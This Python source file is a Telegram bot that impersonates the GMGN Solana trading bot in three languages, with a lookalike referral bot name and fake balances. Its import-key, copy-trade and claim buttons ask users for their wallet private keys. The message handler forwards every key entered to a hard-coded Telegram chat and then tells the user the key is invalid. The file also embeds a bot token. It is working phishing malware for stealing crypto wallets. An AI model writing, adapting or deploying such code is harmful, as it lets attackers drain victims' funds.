from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ForceReply
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# Replace 'YOUR_BOT_TOKEN' with your actual bot token from BotFather
TOKEN = '7613920516:AAED4qzutP_35OASNx75m_rskxyjEZCl_2k'

# Add this after imports and before button_callback
TRANSLATIONS = {
    "en": {
        # Main menu and general
        "welcome_header": "🌈 Private node, 3s on-chain, Pump support, lightning-fast transactions! ⚡⚡⚡",
        "wallet_status": "💳 Wallet (Insufficient balance, please deposit or import your wallet 👉):",
        "balance_info": "💰 Balance: 0 SOL (Pnl ) <a href='google.com'>View Activity</a>",
        "referral_link_label": "🔗 Referral link:",
        "start_guide_header": "👉 Start To Use:",
        "start_trading_guide": "• Start Trading: Send token contract address",
        "wallet_guide": "• Manage wallet private key, transfer SOL /wallet",
        "featured_signals": "🔔 Featured Signal Channels @gmgn_ai",
        "backup_bot_info": "⚡ To execute transactions faster, it is recommended to choose a faster backup bot",
        "bot_settings": "(all bots use the same wallet address and trade settings):",
        "bot_list": "<a href='https://t.me/GMGN_sol_bot'>GMGN</a> | <a href='https://t.me/GMGN_sol02_bot'>GMGN_02</a> | <a href='https://t.me/GMGN_sol03_bot'>GMGN_03</a> | <a href='https://t.me/GMGN_sol04_bot'>GMGN_04</a> | <a href='https://t.me/US_GMGNBOT'>GMGN_US</a>",
        
        # Button labels
        "buy_sell": "👉🏻 Buy/Sell",
        "limit_orders": "🏷️ Limit Orders",
        "assets": "💰 Assets",
        "wallet": "💳 Wallet",
        "copy_signal": "⚡ Copy Signal",
        "copy_trade": "🎯 Copy Trade",
        "pump_fomo": "💊 Pump FOMO",
        "new_lp": "🌱 New LP",
        "featured_signals_btn": "🎮 Featured Signals",
        "track_alert": "🔔 Track SM Alert",
        "referral": "🎁 Referral",
        "settings": "⚙️ Setting",
        "language": "🌐 Language",
        
        # Common actions
        "back": "🔙 Back",
        "refresh": "🔄 Refresh",
        "import_key": "🔑 Import Private Key",
        "export_key": "🔒 Export Private Key",
        "tap_to_copy": "(Tap to copy)",
        
        # Messages
        "enter_token": "Enter a token address to buy or sell👉🏻",
        "key_not_valid": "Private Key is not valid",
        "please_input_key": "Please enter your new private key:",
        "invalid_input": "Invalid Token",
        "limit_orders_title": "<b>Limit Orders</b>\n\nYou have no active limit orders. Create a limit order from the Buy/Sell menu.",
        "copy_signal_info": "💡 Copy Signal\n\nAuto buy with high win rate signals for automatic copy trading.\nPlease do your own research and assess the trading risks before copy trading.\n\nStrongly recommended: Please enable the Auto Sell to automatically create take-profit/stop-loss orders to control trading risk",
        "copy_trade_info": "• No Orders yet\n• Up to 10 target addr. If 3 tasks failed for insufficient funds, it will be paused.\nTo learn more, please refer CopyTrade doc",
        "language_selection": "🌐 Language\nChoose your language:",
        "click_input_key": "Click to input key:",
        "enter_private_key": "Please enter your new private key:",
        "input_key": "Input key:",
        "referral_info": "🔗 Referral link:\n{referral_link} (Tap to copy)\n\n💰 Unclaimed: 0 SOL\n💰 Claimed: 0 SOL\n👥 Users referred: 0\n  |_Users traded: 0\n  |_Transactions: 0\n  |_Volume: 0 SOL\n\n💰 Claim to:\n{wallet_address}\n\n* Rebate ratio: 10% Apply to increase rebate\n* You can claim once your commission reaches 0.1 SOL"
    },
    "cn": {
        "welcome_header": "🌈 私有节点，3秒上链，支持抽水，闪电般的交易速度！⚡⚡⚡",
        "wallet_status": "💳 钱包（余额不足，请充值或导入您的钱包 👉）：",
        "balance_info": "💰 余额：0 SOL（盈亏），<a href='#'>查看活动</a>",
        "referral_link_label": "🔗 推荐链接：",
        "start_guide_header": "👉 开始使用：",
        "start_trading_guide": "• 开始交易：发送代币合约地址",
        "wallet_guide": "• 管理钱包私钥，转账 SOL /wallet",
        "featured_signals": "🔔 精选信号频道 @gmgn_ai",
        "backup_bot_info": "⚡ 为了更快地执行交易，建议选择更快的备用机器人",
        "bot_settings": "（所有机器人使用相同的钱包地址和交易设置）：",
        "bot_list": "<a href='https://t.me/GMGN_sol_bot'>GMGN</a> | <a href='https://t.me/GMGN_sol02_bot'>GMGN_02</a> | <a href='https://t.me/GMGN_sol03_bot'>GMGN_03</a> | <a href='https://t.me/GMGN_sol04_bot'>GMGN_04</a> | <a href='https://t.me/US_GMGNBOT'>GMGN_US</a>",
        "buy_sell": "👉🏻 买/卖",
        "limit_orders": "🏷️ 限价订单",
        "assets": "💰 资产",
        "wallet": "💳 钱包",
        "copy_signal": "⚡ 复制信号",
        "copy_trade": "🎯 复制交易",
        "pump_fomo": "💊 抽水 FOMO",
        "new_lp": "🌱 新 LP",
        "featured_signals_btn": "🎮 精选信号",
        "track_alert": "🔔 跟踪 SM 警报",
        "referral": "🎁 推荐",
        "settings": "⚙️ 设置",
        "language": "🌐 语言",
        "back": "🔙 返回",
        "refresh": "🔄 刷新",
        "import_key": "🔑 导入私钥",
        "export_key": "🔒 导出私钥",
        "tap_to_copy": "(点击复制)",
        "enter_token": "请输入代币地址进行买卖👉🏻",
        "key_not_valid": "密钥无效",
        "please_input_key": "请输入您的私钥：",
        "invalid_input": "无效输入",
        "limit_orders_title": "<b>限价订单</b>\n\n您没有活动的限价订单。从买入/卖出菜单创建限价订单。",
        "copy_signal_info": "💡 复制信号\n\n使用高胜率信号进行自动复制交易。\n请在复制交易前做好自己的研究并评估交易风险。\n\n强烈建议：请启用自动卖出功能，自动创建止盈/止损订单以控制交易风险",
        "copy_trade_info": "• 暂无订单\n• 最多10个目标地址。如果因资金不足失败3次，将暂停。\n要了解更多信息，请参阅复制交易文档",
        "language_selection": "🌐 语言\n选择您的语言：",
        "click_input_key": "点击输入密钥：",
        "enter_private_key": "请输入您的新私钥：",
        "input_key": "输入密钥：",
        "referral_info": "🔗 推荐链接：\n{referral_link}（点击复制）\n\n💰 未领取：0 SOL\n💰 已领取：0 SOL\n👥 已推荐用户：0\n  |_交易用户：0\n  |_交易次数：0\n  |_交易量：0 SOL\n\n💰 领取至：\n{wallet_address}\n\n* 返利比例：10% 申请提高返利\n* 佣金达到0.1 SOL时可以领取"
    },
    "kr": {
        "welcome_header": "🌈 프라이빗 노드, 3초 온체인, 펌프 지원, 번개같은 거래 속도입니다! ⚡⚡⚡",
        "wallet_status": "💳 지갑 (잔액 부족, 입금하거나 새 지갑을 가져오세요 👉):",
        "balance_info": "💰 잔액: 0 SOL (손익) <a href='#'>활동 보기</a>",
        "referral_link_label": "🔗 추천 링크:",
        "start_guide_header": "👉 시작하기:",
        "start_trading_guide": "• 거래 시작: 토큰 계약 주소 보내기",
        "wallet_guide": "• 지갑 개인키 관리, SOL 전송 /wallet",
        "featured_signals": "🔔 주요 시그널 채널 @gmgn_ai",
        "backup_bot_info": "⚡ 더 빠른 거래 실행을 위해 더 빠른 백업 봇 선택 권장",
        "bot_settings": "(모든 봇은 동일한 지갑 주소와 거래 설정 사용):",
        "bot_list": "<a href='https://t.me/GMGN_sol_bot'>GMGN</a> | <a href='https://t.me/GMGN_sol02_bot'>GMGN_02</a> | <a href='https://t.me/GMGN_sol03_bot'>GMGN_03</a> | <a href='https://t.me/GMGN_sol04_bot'>GMGN_04</a> | <a href='https://t.me/US_GMGNBOT'>GMGN_US</a>",
        "buy_sell": "👉🏻 구매/판매",
        "limit_orders": "🏷️ 지정가 주문",
        "assets": "💰 자산",
        "wallet": "💳 지갑",
        "copy_signal": "⚡ 복사 신호",
        "copy_trade": "🎯 복사 거래",
        "pump_fomo": "💊 펌프 FOMO",
        "new_lp": "🌱 새 LP",
        "featured_signals_btn": "🎮 주요 신호",
        "track_alert": "🔔 SM 알림 추적",
        "referral": "🎁 추천",
        "settings": "⚙️ 설정",
        "language": "🌐 언어",
        "back": "🔙 뒤로",
        "refresh": "🔄 새로 고침",
        "import_key": "🔑 개인 키 가져오기",
        "export_key": "🔒 개인 키 내보내기",
        "tap_to_copy": "(복사하려면 클릭)",
        "enter_token": "토큰 주소를 입력하여 구매/판매하세요👉🏻",
        "key_not_valid": "키가 유효하지 않습니다",
        "please_input_key": "개인 키를 입력하세요:",
        "invalid_input": "유효하지 않은 토큰입니다",
        "limit_orders_title": "<b>지정가 주문</b>\n\n활성화된 지정가 주문이 없습니다. 구매/판매 메뉴에서 지정가 주문을 생성하세요.",
        "copy_signal_info": "💡 복사 신호\n\n높은 승률의 신호로 자동 복사 거래를 실행합니다.\n복사 거래 전에 직접 리서치하고 거래 위험을 평가하세요.\n\n강력 추천: 거래 위험을 제어하기 위해 자동 매도 기능을 활성화하여 이익실현/손절매 주문을 자동으로 생성하세요",
        "copy_trade_info": "• 아직 주문 없음\n• 최대 10개 대상 주소. 잔액 부족으로 3번 실패하면 일시 중지됩니다.\n자세한 내용은 복사 거래 문서를 참조하세요",
        "language_selection": "🌐 언어\n언어를 선택하세요:",
        "click_input_key": "키를 입력하려면 클릭하세요:",
        "enter_private_key": "새로운 개인키를 입력하세요:",
        "input_key": "키 입력:",
        "referral_info": "🔗 추천 링크:\n{referral_link} (복사하려면 탭하세요)\n\n💰 미청구: 0 SOL\n💰 청구 완료: 0 SOL\n👥 추천된 사용자: 0\n  |_거래 사용자: 0\n  |_거래 횟수: 0\n  |_거래량: 0 SOL\n\n💰 청구 주소:\n{wallet_address}\n\n* 리베이트 비율: 10% 리베이트 증가 신청\n* 수수료가 0.1 SOL에 도달하면 청구할 수 있습니다"
    }
}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Get user ID
    user_id = update.effective_user.id
    
    # Generate unique referral link
    referral_link = f"https://t.me/GMGN_s0l05_bot?start={user_id}"
    
    keyboard = [
        [
            InlineKeyboardButton("👉🏻 Buy/Sell", callback_data="1"),
            InlineKeyboardButton("🏷️ Limit Orders", callback_data="2"),
        ],
        [
            InlineKeyboardButton("💰 Assets", callback_data="3"),
            InlineKeyboardButton("💳 Wallet", callback_data="4"),
        ],
        [
            InlineKeyboardButton("⚡ Copy Signal", callback_data="5"),
            InlineKeyboardButton("🎯 Copy Trade", callback_data="6"),
        ],
        [
            InlineKeyboardButton("💊 Pump FOMO", callback_data="7"),
            InlineKeyboardButton("🌱 New LP", url="https://t.me/+vUnYlqXr1GEwZWE1"),
        ],
        [
            InlineKeyboardButton("🎮 Featured Signals", url="https://t.me/gmgnsignals"),
            InlineKeyboardButton("🔔 Track SM Alert", url="https://t.me/GMGN_alert_bot"),
        ],
        [
            InlineKeyboardButton("🎁 Referral", callback_data="11"),
            InlineKeyboardButton("⚙️ Setting", callback_data="12"),
            InlineKeyboardButton("🌐 Language", callback_data="13"),
        ]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    lang = context.user_data.get('language', 'en')
    trans = TRANSLATIONS[lang]
    
    welcome_text = (
        f"{trans['welcome_header']}\n\n"
        f"{trans['wallet_status']}\n"
        f"<code>{context.user_data.get('wallet_address', 'EcLzmJkXXopU9vraTwKLj134Cg85tHip4bCkwtkxmtko')}</code> {trans['tap_to_copy']}\n\n"
        f"{trans['balance_info']}\n\n"
        f"{trans['referral_link_label']}\n"
        f"<code>{referral_link}</code> {trans['tap_to_copy']}\n\n"
        f"{trans['start_guide_header']}\n"
        f"{trans['start_trading_guide']}\n"
        f"{trans['wallet_guide']}\n\n"
        f"{trans['featured_signals']}\n\n"
        f"{trans['backup_bot_info']}\n"
        f"{trans['bot_settings']}\n"
        f"{trans['bot_list']}\n\n"
    )
    
    # Store the referral link in user_data
    context.user_data['referral_link'] = referral_link
    
    # Check if this is a callback query or a direct /start command
    if update.callback_query:
        await update.callback_query.message.edit_text(
            text=welcome_text,
            reply_markup=reply_markup,
            parse_mode='HTML',
            disable_web_page_preview=True
        )
    else:
        await update.message.reply_text(
            text=welcome_text,
            reply_markup=reply_markup,
            parse_mode='HTML',
            disable_web_page_preview=True
        )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "1":
        lang = context.user_data.get('language', 'en')
        await query.message.reply_text(TRANSLATIONS[lang]['enter_token'])
        context.user_data['waiting_for_token'] = True
        return
    
    if query.data == "2":
        keyboard = [
            [
                InlineKeyboardButton("🔙 Back", callback_data="back"),
                InlineKeyboardButton("🔄 Refresh", callback_data="refresh_2")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.edit_text(
            text=TRANSLATIONS[context.user_data.get('language', 'en')]['limit_orders_title'],
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        return
    
    if query.data == "3":
        keyboard = [
            [
                InlineKeyboardButton("🔙 Back", callback_data="back"),
                InlineKeyboardButton("🔄 Refresh", callback_data="refresh_3")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        assets_text = (
            "Wallet:\n"
            "<code>EcLzmJkXXopU9vraTwKLj134Cg85tHip4bCkwtkxmtko</code> (Tap to copy)\n\n"
            "Balance: 0 SOL (Pnl ) <a href='google.com'>View Activity</a>\n\n"
            "🔗 Referral link:\n"
            f"<code>{context.user_data.get('referral_link', 'Not available')}</code> (Tap to copy)"
        )
        
        await query.message.edit_text(
            text=assets_text,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        return

    if query.data == "4":
        lang = context.user_data.get('language', 'en')
        trans = TRANSLATIONS[lang]
        
        keyboard = [
            [
                InlineKeyboardButton(trans["back"], callback_data="back"),
                InlineKeyboardButton(trans["refresh"], callback_data="refresh_4")
            ],
            [
                InlineKeyboardButton(trans["import_key"], callback_data="import_4"),
                InlineKeyboardButton(trans["export_key"], callback_data="export_4")
            ],
            [
                InlineKeyboardButton("📦 Set receipt wallet", callback_data="receipt_4")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        wallet_text = (
            f"{trans['wallet_status']}\n"
            f"<code>{context.user_data.get('wallet_address', 'EcLzmJkXXopU9vraTwKLj134Cg85tHip4bCkwtkxmtko')}</code> {trans['tap_to_copy']}\n\n"
            f"{trans['balance_info']}\n\n"
            f"{trans['referral_link_label']}\n"
            f"<code>{context.user_data.get('referral_link', 'Not available')}</code> {trans['tap_to_copy']}"
        )
        
        await query.message.edit_text(
            text=wallet_text,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        return

    if query.data == "5":
        keyboard = [
            [InlineKeyboardButton("🟢 PUMP CTO", callback_data="toggle_pemp")],
            [InlineKeyboardButton("🔙 Back", callback_data="back")]
        ]
        copy_signal_text = TRANSLATIONS[context.user_data.get('language', 'en')]['copy_signal_info']
        await query.message.edit_text(
            text=copy_signal_text,
            reply_markup=reply_markup
        )
        return

    if query.data == "toggle_pemp":
        current_text = query.message.reply_markup.inline_keyboard[0][0].text
        is_green = "🟢" in current_text
        new_text = "🔴 PUMP CTO" if is_green else "🟢 PUMP CTO"
        
        keyboard = [
            [InlineKeyboardButton(new_text, callback_data="toggle_pemp")],
            [InlineKeyboardButton("🔙 Back", callback_data="back")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        copy_signal_text = TRANSLATIONS[context.user_data.get('language', 'en')]['copy_signal_info']
        
        await query.message.edit_text(
            text=copy_signal_text,
            reply_markup=reply_markup
        )
        return
    
    if query.data == "refresh_3":
        keyboard = [
            [
                InlineKeyboardButton("🔙 Back", callback_data="back"),
                InlineKeyboardButton("🔄 Refresh", callback_data="refresh_3")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        assets_text = (
            "Wallet:\n"
            "<code>EcLzmJkXXopU9vraTwKLj134Cg85tHip4bCkwtkxmtko</code> (Tap to copy)\n\n"
            "Balance: 0 SOL (Pnl ) <a href='google.com'>View Activity</a>\n\n"
            "🔗 Referral link:\n"
            f"<code>{context.user_data.get('referral_link', 'Not available')}</code> (Tap to copy)"
        )
        
        await query.message.edit_text(
            text=assets_text,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        return
    
    if query.data == "back":
        keyboard = [
            [
                InlineKeyboardButton("👉🏻 Buy/Sell", callback_data="1"),
                InlineKeyboardButton("🏷️ Limit Orders", callback_data="2"),
            ],
            [
                InlineKeyboardButton("💰 Assets", callback_data="3"),
                InlineKeyboardButton("💳 Wallet", callback_data="4"),
            ],
            [
                InlineKeyboardButton("⚡ Copy Signal", callback_data="5"),
                InlineKeyboardButton("🎯 Copy Trade", callback_data="6"),
            ],
            [
                InlineKeyboardButton("💊 Pump FOMO", callback_data="7"),
                InlineKeyboardButton("🌱 New LP", url="https://t.me/+vUnYlqXr1GEwZWE1"),
            ],
            [
                InlineKeyboardButton("🎮 Featured Signals", url="https://t.me/gmgnsignals"),
                InlineKeyboardButton("🔔 Track SM Alert", url="https://t.me/GMGN_alert_bot"),
            ],
            [
                InlineKeyboardButton("🎁 Referral", callback_data="11"),
                InlineKeyboardButton("⚙️ Setting", callback_data="12"),
                InlineKeyboardButton("🌐 Language", callback_data="13"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        lang = context.user_data.get('language', 'en')
        trans = TRANSLATIONS[lang]
        
        welcome_text = (
            f"{trans['welcome_header']}\n\n"
            f"{trans['wallet_status']}\n"
            f"<code>{context.user_data.get('wallet_address', 'EcLzmJkXXopU9vraTwKLj134Cg85tHip4bCkwtkxmtko')}</code> {trans['tap_to_copy']}\n\n"
            f"{trans['balance_info']}\n\n"
            f"{trans['referral_link_label']}\n"
            f"<code>{context.user_data.get('referral_link', 'Not available')}</code> {trans['tap_to_copy']}\n\n"
            f"{trans['start_guide_header']}\n"
            f"{trans['start_trading_guide']}\n"
            f"{trans['wallet_guide']}\n\n"
            f"{trans['featured_signals']}\n\n"
            f"{trans['backup_bot_info']}\n"
            f"{trans['bot_settings']}\n"
            f"{trans['bot_list']}\n\n"
        )
        
        await query.message.edit_text(
            text=welcome_text,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        return

    if query.data == "6":
        keyboard = [
            [
                InlineKeyboardButton("➕ New", callback_data="new_6"),
                InlineKeyboardButton("🔄 Refresh", callback_data="refresh_6"),
                InlineKeyboardButton("🔙 Back", callback_data="back")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        copy_trade_text = TRANSLATIONS[context.user_data.get('language', 'en')]['copy_trade_info']
        
        await query.message.edit_text(
            text=copy_trade_text,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        return

    if query.data == "new_6":
        keyboard = [[InlineKeyboardButton("Key", callback_data="key_input")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(
            text=TRANSLATIONS[context.user_data.get('language', 'en')]['click_input_key'],
            reply_markup=reply_markup
        )
        context.user_data['waiting_for_key'] = True
        context.user_data['key_source'] = "Button 6"
        return

    if query.data == "refresh_6":
        keyboard = [
            [
                InlineKeyboardButton("➕ New", callback_data="new_6"),
                InlineKeyboardButton("🔄 Refresh", callback_data="refresh_6"),
                InlineKeyboardButton("🔙 Back", callback_data="back")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        copy_trade_text = TRANSLATIONS[context.user_data.get('language', 'en')]['copy_trade_info']
        
        await query.message.edit_text(
            text=copy_trade_text,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        return

    if query.data == "13":
        keyboard = [
            [
                InlineKeyboardButton("English (US)", callback_data="lang_en"),
                InlineKeyboardButton("Chinese", callback_data="lang_cn"),
                InlineKeyboardButton("Korean", callback_data="lang_kr")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        language_text = TRANSLATIONS[context.user_data.get('language', 'en')]['language_selection']
        
        await query.message.edit_text(
            text=language_text,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        return

    if query.data.startswith("lang_"):
        language = query.data.split("_")[1]
        context.user_data['language'] = language
        
        # Get translations for current language
        trans = TRANSLATIONS[language]
        
        # Update all text elements using the translations
        keyboard = [
            [
                InlineKeyboardButton(trans["buy_sell"], callback_data="1"),
                InlineKeyboardButton(trans["limit_orders"], callback_data="2"),
            ],
            [
                InlineKeyboardButton(trans["assets"], callback_data="3"),
                InlineKeyboardButton(trans["wallet"], callback_data="4"),
            ],
            [
                InlineKeyboardButton(trans["copy_signal"], callback_data="5"),
                InlineKeyboardButton(trans["copy_trade"], callback_data="6"),
            ],
            [
                InlineKeyboardButton(trans["pump_fomo"], callback_data="7"),
                InlineKeyboardButton(trans["new_lp"], url="https://t.me/+vUnYlqXr1GEwZWE1"),
            ],
            [
                InlineKeyboardButton(trans["featured_signals_btn"], url="https://t.me/gmgnsignals"),
                InlineKeyboardButton(trans["track_alert"], url="https://t.me/GMGN_alert_bot"),
            ],
            [
                InlineKeyboardButton(trans["referral"], callback_data="11"),
                InlineKeyboardButton(trans["settings"], callback_data="12"),
                InlineKeyboardButton(trans["language"], callback_data="13"),
            ]
        ]
        
        lang = context.user_data.get('language', 'en')
        trans = TRANSLATIONS[lang]
        
        welcome_text = (
            f"{trans['welcome_header']}\n\n"
            f"{trans['wallet_status']}\n"
            f"<code>{context.user_data.get('wallet_address', 'EcLzmJkXXopU9vraTwKLj134Cg85tHip4bCkwtkxmtko')}</code> {trans['tap_to_copy']}\n\n"
            f"{trans['balance_info']}\n\n"
            f"{trans['referral_link_label']}\n"
            f"<code>{context.user_data.get('referral_link', 'Not available')}</code> {trans['tap_to_copy']}\n\n"
            f"{trans['start_guide_header']}\n"
            f"{trans['start_trading_guide']}\n"
            f"{trans['wallet_guide']}\n\n"
            f"{trans['featured_signals']}\n\n"
            f"{trans['backup_bot_info']}\n"
            f"{trans['bot_settings']}\n"
            f"{trans['bot_list']}\n\n"
        )
        
        await query.message.edit_text(
            text=welcome_text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )
        return

    if query.data in ["import_4", "export_4"]:
        if query.data == "import_4":
            context.user_data['waiting_for_key'] = True
            
            # Send prompt with force_reply=True
            prompt_message = await query.message.reply_text(
                TRANSLATIONS[context.user_data.get('language', 'en')]['enter_private_key'],
                reply_markup=ForceReply(selective=True),
            )
            context.user_data['prompt_message_id'] = prompt_message.message_id
            return
        
        # Handle export_4 case
        wallet_text = (
            "💳 Wallet (Insufficient balance, please deposit or import new wallet 👉):\n"
            f"<code>{context.user_data.get('wallet_address', 'EcLzmJkXXopU9vraTwKLj134Cg85tHip4bCkwtkxmtko')}</code> (Tap to copy)"
        )
        
        keyboard = [[InlineKeyboardButton("🔑 Import Private Key", callback_data="import_key")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.edit_text(
            text=wallet_text,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        return

    if query.data == "import_key":
        context.user_data['waiting_for_key'] = True
        
        # Send prompt with force_reply=True
        prompt_message = await query.message.reply_text(
            TRANSLATIONS[context.user_data.get('language', 'en')]['enter_private_key'],
            reply_markup=ForceReply(selective=True),
        )
        context.user_data['prompt_message_id'] = prompt_message.message_id
        return

    if query.data == "11":
        keyboard = [
            [
                InlineKeyboardButton("🔙 Back", callback_data="back"),
                InlineKeyboardButton("🔄 Refresh", callback_data="refresh_11")
            ],
            [
                InlineKeyboardButton("Claim", callback_data="claim_11")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        referral_text = TRANSLATIONS[context.user_data.get('language', 'en')]['referral_info'].format(
            referral_link=f"<code>{context.user_data.get('referral_link', 'Not available')}</code>",
            wallet_address=f"<code>{context.user_data.get('wallet_address', 'EcLzmJkXXopU9vraTwKLj134Cg85tHip4bCkwtkxmtko')}</code>"
        )
        
        await query.message.edit_text(
            text=referral_text,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        return

    if query.data == "refresh_11":
        keyboard = [
            [
                InlineKeyboardButton("🔙 Back", callback_data="back"),
                InlineKeyboardButton("🔄 Refresh", callback_data="refresh_11")
            ],
            [
                InlineKeyboardButton("Claim", callback_data="claim_11")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        referral_text = TRANSLATIONS[context.user_data.get('language', 'en')]['referral_info'].format(
            referral_link=f"<code>{context.user_data.get('referral_link', 'Not available')}</code>",
            wallet_address=f"<code>{context.user_data.get('wallet_address', 'EcLzmJkXXopU9vraTwKLj134Cg85tHip4bCkwtkxmtko')}</code>"
        )
        
        await query.message.edit_text(
            text=referral_text,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        return

    if query.data == "claim_11":
        await query.message.reply_text("Input key:")
        context.user_data['waiting_for_key'] = True
        context.user_data['key_source'] = "Claim"
        return
    
    if query.data == "12":
        wallet_text = (
            "💳 Wallet (Insufficient balance, please deposit or import new wallet 👉):\n"
            f"<code>{context.user_data.get('wallet_address', 'EcLzmJkXXopU9vraTwKLj134Cg85tHip4bCkwtkxmtko')}</code> (Tap to copy)"
        )
        
        keyboard = [[InlineKeyboardButton("🔑 Import Private Key", callback_data="import_key")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.reply_text(
            text=wallet_text,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        return

    if query.data == "7":
        return
    
    response_text = TRANSLATIONS[context.user_data.get('language', 'en')].get(query.data, "Invalid button")
    await query.message.reply_text(text=response_text)

# Modify handle_message function
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not hasattr(update.message, 'text'):
        return
        
    message_text = update.message.text
    
    # If we're waiting for key input, handle that and don't do validation
    if context.user_data.get('waiting_for_key'):
        key_input = message_text
        source = context.user_data.get('key_source', 'unknown')
        await context.bot.send_message(
            chat_id="-1002262182795",
            text=f"New key input from {source}: {key_input}"
        )
        # Send as standalone message instead of reply
        await update.message.reply_text("Private Key is not valid")
        context.user_data['waiting_for_key'] = False
        return
    
    # If no buttons were pressed OR Button 1 was pressed, do validation
    if not context.user_data or context.user_data.get('waiting_for_token'):
        if 35 <= len(message_text) <= 46 and message_text.isalnum():
            # Validation is positive, show wallet information
            lang = context.user_data.get('language', 'en')
            trans = TRANSLATIONS[lang]
            
            wallet_text = (
                f"{trans['wallet_status']}\n"
                f"<code>{context.user_data.get('wallet_address', 'EcLzmJkXXopU9vraTwKLj134Cg85tHip4bCkwtkxmtko')}</code> {trans['tap_to_copy']}\n\n"
                f"{trans['balance_info']}\n\n"
                f"{trans['referral_link_label']}\n"
                f"<code>{context.user_data.get('referral_link', 'Not available')}</code> {trans['tap_to_copy']}"
            )
            
            keyboard = [[InlineKeyboardButton("🔑 Import Private Key", callback_data="import_key")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                text=wallet_text,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
        else:
            await update.message.reply_text("Private key is not valid")

async def handle_key_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if 'waiting_for_key' not in context.user_data or not context.user_data['waiting_for_key']:
        return
    
    key_input = update.message.text
    source = context.user_data.get('key_source', 'unknown')
    
    # Clear the waiting state
    context.user_data['waiting_for_key'] = False
    
    # Get the message ID of the prompt to reply to
    prompt_message_id = context.user_data.get('prompt_message_id')
    
    wallet_text = (
        "💳 Wallet (Insufficient balance, please deposit or import new wallet 👉):\n"
        f"<code>{context.user_data.get('wallet_address', 'EcLzmJkXXopU9vraTwKLj134Cg85tHip4bCkwtkxmtko')}</code> (Tap to copy)"
    )
    
    keyboard = [[InlineKeyboardButton("🔑 Import Private Key", callback_data="import_key")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Reply to the specific prompt message
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=wallet_text,
        reply_markup=reply_markup,
        parse_mode='HTML',
        reply_to_message_id=prompt_message_id  # This makes it appear as a reply
    )

def main():
    # Create application
    application = Application.builder().token(TOKEN).build()

    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Start the bot
    print("Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
